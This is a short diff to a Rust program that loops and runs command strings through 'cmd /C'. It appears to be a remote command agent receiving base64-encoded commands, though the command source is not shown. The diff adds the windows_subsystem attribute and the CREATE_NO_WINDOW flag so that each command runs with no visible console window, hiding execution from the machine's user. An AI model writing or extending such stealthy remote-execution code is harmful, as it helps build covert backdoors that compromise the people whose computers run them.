@@ -1,10 +1,13 @@
+
+#![windows_subsystem = "windows"]
 use std::error::Error;
+use std::os::windows::process::CommandExt;
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
 use base64::prelude::*;
 
-
+const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 fn main() {
     loop {
@@ -19,6 +22,7 @@ fn main() {
 
             let output = Command::new("cmd")
                 .args(&["/C", command.as_str()])
+                .creation_flags(CREATE_NO_WINDOW)
                 .output()
                 .expect("failed to execute process");
 
